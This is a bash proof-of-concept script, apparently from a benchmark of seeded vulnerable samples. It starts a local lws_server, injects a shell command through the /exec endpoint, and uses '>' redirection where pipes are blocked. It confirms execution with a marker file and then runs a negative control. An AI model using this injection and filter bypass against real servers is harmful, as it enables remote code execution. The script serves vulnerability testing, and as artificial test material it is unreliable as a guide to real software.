#!/usr/bin/env bash
# PoC for 185_libwebsockets_C2I1S2
# Axes: C2 (config file gate) / I1 (direct to sink) / S2 (pipe blocked, bypass with ;)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lws_server"
WWWROOT="/tmp/poc_185_www"
MARKER="/tmp/poc_185_marker"
CONF="/tmp/poc_185.conf"
PORT=18185
NEG_PORT=19185

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create exec config file (C2 gate)
cat > "$CONF" <<EOF
exec_mode = 1
exec_logging = 1
EOF

# Start server with exec config
echo "[*] starting lws_server with --exec-config on port $PORT..."
"$BINARY" --port "$PORT" --wwwroot "$WWWROOT" --exec-config "$CONF" &
SERVER_PID=$!
sleep 0.5

# Trigger exploit (S2 bypass: use > redirection, not pipe)
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

# Verify RCE
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# Negative control: start WITHOUT --exec-config (exec_cfg stays zeroed)
echo "[*] verifying gate: endpoint absent without --exec-config..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0

"$BINARY" --port "$NEG_PORT" --wwwroot "$WWWROOT" &
NEG_PID=$!
sleep 0.5
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-config"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
